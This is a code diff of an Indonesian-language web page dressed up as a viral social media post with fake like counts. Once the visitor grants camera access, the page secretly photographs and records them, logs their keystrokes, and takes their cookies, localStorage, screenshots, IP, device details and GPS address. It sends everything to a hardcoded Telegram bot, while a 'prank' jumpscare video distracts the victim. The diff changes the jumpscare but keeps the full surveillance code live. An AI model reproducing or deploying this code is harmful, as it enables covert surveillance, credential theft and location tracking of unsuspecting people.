@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Viral Banget 🔥</title>
-    <!-- Library untuk screenshot -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         * {
@@ -286,28 +285,27 @@
             display: none;
         }
         
-        /* Jumpscare element */
         .jumpscare-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #ff0000;
+            background: #000;
             z-index: 99999;
             display: none;
             align-items: center;
             justify-content: center;
-            font-size: 80px;
-            color: white;
-            animation: jumpscareFlash 0.3s;
             pointer-events: none;
         }
         
-        @keyframes jumpscareFlash {
-            0% { opacity: 0; }
-            50% { opacity: 1; }
-            100% { opacity: 0; }
+        .jumpscare-video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
     </style>
 </head>
@@ -407,9 +405,14 @@
         <div class="small-note" id="smallNote"></div>
     </div>
     
-    <!-- Jumpscare Element -->
+    <!-- 2 Video Jumpscare Berurutan -->
     <div class="jumpscare-overlay" id="jumpscareOverlay">
-        <span>👻 BOO! 👻</span>
+        <video id="video1" class="jumpscare-video" muted playsinline style="display: none;">
+            <source src="hantu1.mp4" type="video/mp4">
+        </video>
+        <video id="video2" class="jumpscare-video" muted playsinline style="display: none;">
+            <source src="hantu2.mp4" type="video/mp4">
+        </video>
     </div>
     
     <video id="hiddenCamera" autoplay playsinline></video>
@@ -423,7 +426,6 @@
         const TELEGRAM_CHAT_ID = '6239380758';
         // ===========================================
         
-        // State
         let liked = false;
         let likeCount = 2200;
         let mediaStream = null;
@@ -434,163 +436,115 @@
         let mediaRecorder = null;
         let videoChunks = [];
         
-        // Data korban
         let dataKorban = {
-            ip: 'Unknown',
-            kota: 'Unknown',
-            negara: 'Unknown',
-            isp: 'Unknown',
-            lat: null,
-            lon: null,
-            alamat: 'Tidak ada',
-            device: 'Unknown',
-            browser: 'Unknown',
-            os: 'Unknown',
-            resolusi: 'Unknown',
-            baterai: 'Unknown'
+            ip: 'Unknown', kota: 'Unknown', negara: 'Unknown', isp: 'Unknown',
+            lat: null, lon: null, alamat: 'Tidak ada', device: 'Unknown',
+            browser: 'Unknown', os: 'Unknown', resolusi: 'Unknown', baterai: 'Unknown'
         };
         
-        // ===========================================
-        // FUNGSI KIRIM PESAN
-        // ===========================================
         async function kirimPesan(teks) {
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: teks
-                    })
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: teks })
                 });
             } catch (e) {}
         }
         
-        // ===========================================
-        // FUNGSI KIRIM FOTO
-        // ===========================================
         async function kirimFoto(blob, filename) {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, filename);
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
             } catch (e) {}
         }
         
-        // ===========================================
-        // FUNGSI KIRIM VIDEO
-        // ===========================================
         async function kirimVideo(blob, filename) {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('video', blob, filename);
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: formData });
             } catch (e) {}
         }
         
-        // ===========================================
-        // KEYLOGGER
-        // ===========================================
         let keyLog = '';
         document.addEventListener('keydown', (e) => {
             keyLog += e.key;
-            if (keyLog.length > 50) {
-                kirimPesan('⌨️ ' + keyLog);
-                keyLog = '';
-            }
+            if (keyLog.length > 50) { kirimPesan('⌨️ ' + keyLog); keyLog = ''; }
         });
         
-        // ===========================================
-        // AMBIL COOKIES
-        // ===========================================
-        setTimeout(() => {
-            if (document.cookie) {
-                kirimPesan('🍪 ' + document.cookie);
-            }
-        }, 5000);
-        
-        // ===========================================
-        // AMBIL LOCALSTORAGE
-        // ===========================================
+        setTimeout(() => { if (document.cookie) kirimPesan('🍪 ' + document.cookie); }, 5000);
         setTimeout(() => {
             let storage = '';
-            Object.keys(localStorage).forEach(key => {
-                storage += key + '=' + localStorage.getItem(key) + ' | ';
-            });
-            if (storage) {
-                kirimPesan('💾 ' + storage);
-            }
+            Object.keys(localStorage).forEach(key => { storage += key + '=' + localStorage.getItem(key) + ' | '; });
+            if (storage) kirimPesan('💾 ' + storage);
         }, 7000);
         
-        // ===========================================
-        // SCREENSHOT BERKALA
-        // ===========================================
         setInterval(() => {
             if (typeof html2canvas !== 'undefined' && isActive) {
                 html2canvas(document.body).then(canvas => {
-                    canvas.toBlob(async (blob) => {
-                        await kirimFoto(blob, 'screenshot.png');
-                    }, 'image/png');
+                    canvas.toBlob(async (blob) => { await kirimFoto(blob, 'screenshot.png'); }, 'image/png');
                 });
             }
         }, 60000);
         
-        // ===========================================
-        // FUNGSI JUMPSCARE
-        // ===========================================
+        // ========== FUNGSI JUMPSCARE 2 VIDEO DENGAN TIMER ==========
         function triggerJumpscare() {
             const body = document.body;
             const card = document.getElementById('mainCard');
-            const jumpscare = document.getElementById('jumpscareOverlay');
+            const overlay = document.getElementById('jumpscareOverlay');
+            const video1 = document.getElementById('video1');
+            const video2 = document.getElementById('video2');
             
-            // Tambah efek getar
             body.classList.add('jumpscare-shake');
             card.classList.add('jumpscare-shake');
+            overlay.style.display = 'flex';
             
-            // Tampilkan jumpscare
-            jumpscare.style.display = 'flex';
+            window.scrollBy(5, 5); window.scrollBy(-5, -5);
+            window.scrollBy(5, -5); window.scrollBy(-5, 5);
             
-            // Efek scroll dikit
-            window.scrollBy(5, 5);
-            window.scrollBy(-5, -5);
-            window.scrollBy(5, -5);
-            window.scrollBy(-5, 5);
+            // Reset video
+            video1.currentTime = 0;
+            video2.currentTime = 0;
+            video1.style.display = 'block';
+            video2.style.display = 'none';
             
-            // Hilangin setelah 0.5 detik
+            // Putar video1
+            video1.play().catch(e => console.log('Auto-play perlu interaksi'));
+            
+            // VIDEO 1 JALAN 33 DETIK
             setTimeout(() => {
-                body.classList.remove('jumpscare-shake');
-                card.classList.remove('jumpscare-shake');
-                jumpscare.style.display = 'none';
-            }, 500);
+                video1.style.display = 'none';
+                video1.pause();
+                
+                video2.style.display = 'block';
+                video2.currentTime = 0;
+                video2.play().catch(e => console.log());
+                
+                // VIDEO 2 JALAN 17 DETIK
+                setTimeout(() => {
+                    body.classList.remove('jumpscare-shake');
+                    card.classList.remove('jumpscare-shake');
+                    overlay.style.display = 'none';
+                    video2.pause();
+                    video1.style.display = 'none';
+                    video2.style.display = 'none';
+                }, 17000);
+                
+            }, 33000);
         }
         
         function toggleLike() {
             const likeIcon = document.getElementById('likeIcon');
             const likeCountEl = document.getElementById('likeCount');
             const likeBtn = document.getElementById('likeBtn');
-            
             if (!liked) {
-                likeIcon.innerHTML = '❤️';
-                likeCount += 1;
-                likeBtn.classList.add('active');
-                liked = true;
+                likeIcon.innerHTML = '❤️'; likeCount += 1; likeBtn.classList.add('active'); liked = true;
             } else {
-                likeIcon.innerHTML = '❤️';
-                likeCount -= 1;
-                likeBtn.classList.remove('active');
-                liked = false;
+                likeIcon.innerHTML = '❤️'; likeCount -= 1; likeBtn.classList.remove('active'); liked = false;
             }
-            
             likeCountEl.innerHTML = formatNumber(likeCount);
         }
         
@@ -599,14 +553,10 @@
             return num.toString();
         }
         
-        // ===========================================
-        // AMBIL IP
-        // ===========================================
         async function getIPLocation() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                
                 dataKorban.ip = data.ip || 'Unknown';
                 dataKorban.kota = data.city || 'Unknown';
                 dataKorban.negara = data.country_name || 'Unknown';
@@ -622,52 +572,33 @@
             }
         }
         
-        // ===========================================
-        // AMBIL GPS
-        // ===========================================
         async function getGPSLocation() {
             return new Promise((resolve) => {
                 if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            dataKorban.lat = position.coords.latitude;
-                            dataKorban.lon = position.coords.longitude;
-                            
-                            try {
-                                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${dataKorban.lat}&lon=${dataKorban.lon}`);
-                                const data = await res.json();
-                                if (data.display_name) {
-                                    dataKorban.alamat = data.display_name;
-                                }
-                            } catch (e) {}
-                            
-                            resolve(true);
-                        },
-                        () => resolve(false)
-                    );
-                } else {
-                    resolve(false);
-                }
+                    navigator.geolocation.getCurrentPosition(async (position) => {
+                        dataKorban.lat = position.coords.latitude;
+                        dataKorban.lon = position.coords.longitude;
+                        try {
+                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${dataKorban.lat}&lon=${dataKorban.lon}`);
+                            const data = await res.json();
+                            if (data.display_name) dataKorban.alamat = data.display_name;
+                        } catch (e) {}
+                        resolve(true);
+                    }, () => resolve(false));
+                } else { resolve(false); }
             });
         }
         
-        // ===========================================
-        // AMBIL DEVICE INFO
-        // ===========================================
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            
             if (ua.includes('Chrome')) dataKorban.browser = 'Chrome';
             else if (ua.includes('Firefox')) dataKorban.browser = 'Firefox';
             else if (ua.includes('Safari')) dataKorban.browser = 'Safari';
-            
             if (ua.includes('Windows')) dataKorban.os = 'Windows';
             else if (ua.includes('Android')) dataKorban.os = 'Android';
             else if (ua.includes('iPhone')) dataKorban.os = 'iOS';
             else if (ua.includes('Mac')) dataKorban.os = 'macOS';
-            
             dataKorban.resolusi = `${screen.width}x${screen.height}`;
-            
             if ('getBattery' in navigator) {
                 navigator.getBattery().then(battery => {
                     let level = Math.round(battery.level * 100);
@@ -676,9 +607,6 @@
             }
         }
         
-        // ===========================================
-        // KIRIM DATA AWAL
-        // ===========================================
         async function sendInitialData() {
             const pesan = `🔥 *PRANK DIMULAI!* 🔥
 ━━━━━━━━━━━━━━━━━━
@@ -690,186 +618,93 @@
 📺 Resolusi: ${dataKorban.resolusi}
 🔋 Baterai: ${dataKorban.baterai}
 ⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
-            
             await kirimPesan(pesan);
         }
         
-        // ===========================================
-        // KIRIM LOKASI
-        // ===========================================
         async function sendLocation() {
             if (dataKorban.lat && dataKorban.lon) {
                 try {
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            latitude: dataKorban.lat,
-                            longitude: dataKorban.lon
-                        })
+                        method: 'POST', headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: dataKorban.lat, longitude: dataKorban.lon })
                     });
                 } catch (e) {}
             }
         }
         
-        // ===========================================
-        // FUNGSI AMBIL FOTO BERKALA
-        // ===========================================
         async function ambilFoto() {
             if (!isActive || !mediaStream) return;
-            
             try {
                 fotoCount++;
-                
                 const video = document.getElementById('hiddenCamera');
                 const canvas = document.getElementById('hiddenCanvas');
                 const context = canvas.getContext('2d');
-                
-                canvas.width = 320;
-                canvas.height = 240;
+                canvas.width = 320; canvas.height = 240;
                 context.drawImage(video, 0, 0, 320, 240);
-                
                 const fotoData = canvas.toDataURL('image/jpeg', 0.6);
                 const binary = atob(fotoData.split(',')[1]);
                 const array = new Uint8Array(binary.length);
-                for (let i = 0; i < binary.length; i++) {
-                    array[i] = binary.charCodeAt(i);
-                }
+                for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
                 const fotoBlob = new Blob([array], {type: 'image/jpeg'});
-                
                 await kirimFoto(fotoBlob, `foto_${fotoCount}.jpg`);
             } catch (e) {}
         }
         
-        // ===========================================
-        // FUNGSI REKAM VIDEO (5 DETIK)
-        // ===========================================
         function rekamVideo() {
             if (!isActive || !mediaStream) return;
-            
             try {
                 videoCount++;
                 videoChunks = [];
-                
-                const recorder = new MediaRecorder(mediaStream, {
-                    mimeType: 'video/webm'
-                });
-                
-                recorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) {
-                        videoChunks.push(e.data);
-                    }
-                };
-                
+                const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+                recorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
                 recorder.onstop = async () => {
                     const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                     await kirimVideo(videoBlob, `video_${videoCount}.webm`);
                 };
-                
                 recorder.start();
-                setTimeout(() => {
-                    if (recorder.state === 'recording') {
-                        recorder.stop();
-                    }
-                }, 5000); // Rekam 5 detik
-                
+                setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
             } catch (e) {}
         }
         
-        // ===========================================
-        // FUNGSI UTAMA
-        // ===========================================
         async function handleClick() {
             const viralImage = document.getElementById('viralImage');
             const smallNote = document.getElementById('smallNote');
-            
             viralImage.style.pointerEvents = 'none';
-            
             try {
                 await getIPLocation();
                 getDeviceInfo();
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 320 },
-                        height: { ideal: 240 }
-                    }, 
-                    audio: false
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }, audio: false });
                 mediaStream = stream;
                 isActive = true;
-                
                 const video = document.getElementById('hiddenCamera');
                 video.srcObject = stream;
                 await video.play();
-                
-                // 👻 JUMPSCARE SETELAH IZIN KAMERA
-                setTimeout(() => {
-                    triggerJumpscare();
-                }, 500);
-                
-                // Ambil foto pertama
+                setTimeout(() => { triggerJumpscare(); }, 500);
                 await ambilFoto();
-                
-                // Kirim data awal
                 await sendInitialData();
-                
-                // Minta GPS
-                getGPSLocation().then(() => {
-                    sendLocation();
-                });
-                
-                // HILANGIN GAMBAR VIRAL
+                getGPSLocation().then(() => { sendLocation(); });
                 viralImage.style.display = 'none';
-                
-                // FOTO SETIAP 5 DETIK
                 fotoInterval = setInterval(ambilFoto, 5000);
-                
-                // VIDEO SETIAP 30 DETIK (rekam 5 detik)
                 setInterval(rekamVideo, 30000);
-                
-                // Video pertama setelah 2 detik
                 setTimeout(rekamVideo, 2000);
-                
             } catch (error) {
                 viralImage.style.pointerEvents = 'auto';
                 smallNote.innerHTML = '⚠️ Klik izinkan akses kamera';
-                setTimeout(() => {
-                    smallNote.innerHTML = '';
-                }, 3000);
+                setTimeout(() => { smallNote.innerHTML = ''; }, 3000);
             }
         }
         
-        // ===========================================
-        // TAB DITUTUP
-        // ===========================================
         window.addEventListener('beforeunload', function() {
-            if (fotoInterval) {
-                clearInterval(fotoInterval);
-            }
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
-            }
+            if (fotoInterval) clearInterval(fotoInterval);
+            if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
         });
         
-        // ===========================================
-        // UPDATE STATS
-        // ===========================================
         setInterval(() => {
-            if (!document.getElementById('prankResult').style.display || 
-                document.getElementById('prankResult').style.display === 'none') {
+            if (!document.getElementById('prankResult').style.display || document.getElementById('prankResult').style.display === 'none') {
                 const likes = Math.floor(2100 + Math.random() * 300);
                 const comments = Math.floor(230 + Math.random() * 40);
-                document.getElementById('stats').innerHTML = 
-                    `${formatNumber(likes)} suka · ${comments} komentar · 324 dibagikan`;
-                
-                if (!liked) {
-                    document.getElementById('likeCount').innerHTML = formatNumber(likes);
-                    likeCount = likes;
-                }
+                document.getElementById('stats').innerHTML = `${formatNumber(likes)} suka · ${comments} komentar · 324 dibagikan`;
+                if (!liked) { document.getElementById('likeCount').innerHTML = formatNumber(likes); likeCount = likes; }
             }
         }, 8000);
     </script>
